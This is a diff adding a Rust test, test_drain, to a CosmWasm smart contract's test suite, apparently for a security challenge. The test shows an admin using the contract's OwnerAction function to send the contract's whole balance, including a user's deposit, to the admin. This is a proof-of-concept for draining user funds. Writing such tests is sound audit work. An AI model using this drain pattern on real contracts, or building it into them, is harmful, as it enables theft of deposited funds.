@@ -4,7 +4,7 @@ pub mod tests {
         contract::DENOM,
         msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
     };
-    use cosmwasm_std::{coin, Addr, Empty, Uint128};
+    use cosmwasm_std::{coin, Addr, BankMsg, CosmosMsg, Empty, Uint128};
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
 
     pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
@@ -140,5 +140,43 @@ pub mod tests {
 
         let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
         assert_eq!(bal.amount, Uint128::new(100));
+    }
+
+    #[test]
+    fn test_drain() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
+        assert_eq!(bal.amount, Uint128::new(100));
+
+        // User 1 deposit
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(100, DENOM)],
+        )
+        .unwrap();
+
+        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
+        assert_eq!(bal.amount, Uint128::zero());
+
+        // Step 2: Owner uses the `OwnerAction` function to send a `BankMsg::Send` message,
+        // transferring all the contract's balance to their own account
+
+        let withdraw_msg = BankMsg::Send {
+            to_address: ADMIN.to_string(),
+            amount: vec![coin(1_000_000, DENOM)],
+        };
+
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            contract_addr,
+            &ExecuteMsg::OwnerAction {
+                msg: CosmosMsg::Bank(withdraw_msg),
+            },
+            &[],
+        )
+        .unwrap();
     }
 }
